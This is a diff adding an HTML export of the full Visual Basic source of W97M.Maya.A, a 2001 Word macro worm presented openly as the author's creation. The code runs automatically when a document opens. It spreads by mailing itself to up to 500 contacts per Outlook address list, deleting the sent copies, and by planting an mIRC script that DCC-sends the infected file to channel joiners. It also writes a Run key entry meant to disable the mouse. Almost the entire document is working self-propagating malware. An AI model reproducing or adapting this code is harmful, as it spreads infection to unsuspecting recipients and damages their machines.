@@ -1,0 +1,134 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Worm Name : W97M.Maya.A
+' Author : PetiK
+' Date : May 29th – June 1st 2001
+' Size : 33792 – 33280 (with change) bytes
+'
+'
+'
+' Change the properties of the documents. If not exist the Value “W97M.Maya” in
+' the key HKLM\Software\, the worm copy itself to C:\Windows\Maya.doc. It creates
+' the “C:\Maya” directory with a TXT file and a acript file to infect mIRC
+' channel. After, it spreads with Microsoft Outlook.
+'   Subject :   “Hi man, it’s ” + user name
+'   Body :  “This is the new net Story”
+'           “It 's great”
+'   Attachment : Maya.doc
+' On 5th of the month, when the document is close, a message box appears.
+' When Visual Basic is active, an other message box appears and the worm
+' add a value in the “RunKey” of regedit to disabled the mouse.
+</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoOpen</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Dialogs</span><span class="sc6">(</span><span class="sc7">wdDialogFileSummaryInfo</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc6">.</span><span class="sc7">Author</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"PetiK"</span><span class="sc0">
+</span><span class="sc6">.</span><span class="sc7">Title</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"WM97.Maya"</span><span class="sc0">
+</span><span class="sc6">.</span><span class="sc7">Comments</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"To my best GirlFriend"</span><span class="sc0">
+</span><span class="sc6">.</span><span class="sc7">Keywords</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Maya, Bzzbzz, to grow"</span><span class="sc0">
+</span><span class="sc6">.</span><span class="sc7">Execute</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Maya"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Par PetiK"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+
+</span><span class="sc7">ActiveDocument.SaveAs</span><span class="sc0"> </span><span class="sc7">FileName</span><span class="sc6">:=</span><span class="sc4">"C:\Windows\Maya.doc"</span><span class="sc0">
+</span><span class="sc7">ActiveDocument.Saved</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+
+</span><span class="sc7">FileSystem.MkDir</span><span class="sc0"> </span><span class="sc4">"C:\Maya"</span><span class="sc0">
+</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"C:\Maya\hello.txt"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Le 29 mai 2001 à Munster"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"This is my first W97M.Outlook.Worm"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Its name is W97M.Maya"</span><span class="sc0">
+</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
+</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n0=on 1:JOIN:#:{"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n1= /if ( $nick == $me ) { halt }"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n2= /.dcc send $nick C:\Windows\Maya.doc"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n3=}"</span><span class="sc0">
+</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
+</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\mirc\script.ini"</span><span class="sc0">
+</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\mirc32\script.ini"</span><span class="sc0">
+</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\progra~1\mirc\script.ini"</span><span class="sc0">
+</span><span class="sc7">FileSystem.FileCopy</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\progra~1\mirc32\script.ini"</span><span class="sc0">
+</span><span class="sc7">FileSystem.Kill</span><span class="sc0"> </span><span class="sc4">"C:\Maya\script.ini"</span><span class="sc0">
+
+</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M.Maya"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Par PetiK"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">maya</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bzzbzz</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">petik</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">maya</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">bzzbzz</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">maya.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">maya</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+    </span><span class="sc7">bzzbzz.Logon</span><span class="sc0"> </span><span class="sc4">"profile"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"password"</span><span class="sc0">
+    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">mayacompte</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">bzzbzz.AddressLists.Count</span><span class="sc0">
+        </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">AB</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">bzzbzz.AddressLists</span><span class="sc6">(</span><span class="sc7">mayacompte</span><span class="sc6">)</span><span class="sc0">
+        </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">petik</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">maya.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">compte</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">AB.AddressEntries.Count</span><span class="sc0">
+            </span><span class="sc7">verif</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AB.AddressEntries</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0">
+            </span><span class="sc7">petik.Recipients.Add</span><span class="sc0"> </span><span class="sc7">verif</span><span class="sc0">
+            </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">compte</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AB.AddressEntries.Count</span><span class="sc0">
+        </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">compte</span><span class="sc0">
+        </span><span class="sc7">petik.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hi man, it's "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Application.UserName</span><span class="sc0">
+        </span><span class="sc7">petik.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"This is the new net Story"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"It's great"</span><span class="sc0">
+        </span><span class="sc7">petik.Attachments.Add</span><span class="sc0"> </span><span class="sc7">ActiveDocument.FullName</span><span class="sc0">
+        </span><span class="sc7">petik.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+        </span><span class="sc7">petik.Send</span><span class="sc0">
+        </span><span class="sc7">verif</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">mayacompte</span><span class="sc0">
+    </span><span class="sc7">bzzbzz.Logoff</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoClose</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Coded by PetiK (c)2001"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbInformation</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WM97.Maya"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ViewVBCode</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MayAttack"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"rundll32 mouse,disable"</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Curiosity is bad"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"With her small size"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"Maya is alwayas there"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WM97.Maya"</span><span class="sc0">
+</span><span class="sc7">ShowVisualBasicEditor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+
+</span></div></body>
+</html>
